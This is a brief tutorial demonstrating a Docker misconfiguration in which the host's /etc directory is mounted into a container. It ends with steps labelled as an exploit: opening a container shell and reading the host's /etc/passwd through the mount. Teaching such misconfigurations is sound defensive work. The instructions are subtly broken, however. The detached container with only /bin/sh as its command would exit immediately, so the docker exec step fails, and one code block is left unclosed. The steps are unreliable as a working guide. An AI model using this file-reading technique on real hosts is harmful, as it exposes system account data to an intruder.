# Docker Misconfiguration: Binding Sensitive Host Directories

Another example of a Docker misconfiguration is binding sensitive host directories inside a container. This can expose sensitive data to an attacker with access to the container.

## Set up a vulnerable environment:

1. Create a new Dockerfile with the following content:

   ```Dockerfile
   FROM alpine:3.14

   CMD ["/bin/sh"]

2. Build the Docker image and run the container:
```shell
docker build -t sensitive_data_vulnerable .
docker run -d --name sensitive_data_vulnerable_container -v /etc:/host_etc sensitive_data_vulnerable
```
In this command, we are mounting the /etc directory from the host inside the container under /host_etc.

# Exploit the vulnerability
1. Access the container shell:

```shell
docker exec -it sensitive_data_vulnerable_container /bin/sh
```

2. display the contents of the /etc/passwd file:

```shell
cat /host_etc/passwd
```




